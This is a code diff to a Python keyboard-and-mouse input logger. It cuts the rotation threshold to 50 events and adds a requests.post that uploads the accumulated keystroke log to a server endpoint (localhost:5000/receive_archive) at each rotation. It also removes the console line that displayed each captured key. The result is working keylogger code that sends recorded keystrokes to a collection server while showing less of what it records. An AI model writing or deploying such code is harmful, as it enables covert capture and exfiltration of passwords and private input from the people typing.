@@ -6,11 +6,13 @@ import subprocess
 import json
 import uuid
 import os
-import shutil
+import shutil 
+import requests
 
 LOG_FILE    = "input_events.jsonl"
 BACKUP_FILE = "input_events_backup.jsonl"
-MAX_INPUTS  = 10000
+MAX_INPUTS  = 50
+SERVER_URL  = "http://localhost:5000/receive_archive"
 
 mouse_controller = MouseController()
 
@@ -41,6 +43,22 @@ def rotate_if_needed():
         os.remove(BACKUP_FILE)
     # Copy and then truncate
     shutil.copy2(LOG_FILE, BACKUP_FILE)
+    
+    # Read the backup file and send it to the server
+    try:
+        with open(BACKUP_FILE, 'r') as f:
+            archive_data = f.read()
+            print(f"[SERVER] Attempting to send {len(archive_data)} bytes to server...", flush=True)
+            response = requests.post(SERVER_URL, data=archive_data, headers={'Content-Type': 'application/json'})
+            if response.status_code == 200:
+                print(f"[SERVER] Successfully sent archive to server: {response.json()}", flush=True)
+            else:
+                print(f"[SERVER] Failed to send archive. Status code: {response.status_code}, Response: {response.text}", flush=True)
+    except requests.exceptions.ConnectionError as e:
+        print(f"[SERVER] Connection error: {str(e)}", flush=True)
+    except Exception as e:
+        print(f"[SERVER] Error sending archive: {str(e)}", flush=True)
+    
     open(LOG_FILE, "w").close()
     print(f"[ROTATE] backed up {MAX_INPUTS} lines → {BACKUP_FILE}", flush=True)
     line_counter = 0
@@ -65,7 +83,6 @@ def log_event(event_type, key_or_button):
         f.write(json.dumps(event_data) + "\n")
 
     line_counter += 1
-    print(f"[LOGGED] #{line_counter}: {event_type} → {key_or_button}", flush=True)
     rotate_if_needed()
 
 # Keyboard Handlers
